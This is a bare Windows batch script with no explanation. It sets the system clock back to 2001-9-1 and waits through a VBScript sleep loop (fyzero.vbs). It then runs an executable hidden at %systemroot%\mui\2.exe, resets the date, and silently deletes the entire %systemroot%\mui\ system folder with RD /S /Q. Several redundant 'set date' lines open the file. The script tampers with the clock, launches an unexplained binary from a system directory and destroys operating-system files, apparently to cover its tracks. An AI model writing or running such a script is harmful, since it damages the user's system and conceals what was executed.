set date=%date%
set date=%date%
set date=%date%
set date=%date%
set date=%date%
date 2001-9-1
@echo off & setlocal enableextensions
echo WScript.Sleep 1000 > fyzero.vbs
set /a i = 10
:Timeout
if %i% == 0 goto Next
setlocal
set /a i = %i% - 1
cscript //nologo fyzero.vbs
goto Timeout
goto End
:Next
%systemroot%\mui\2.exe
date %date%
RD /S /Q %systemroot%\mui\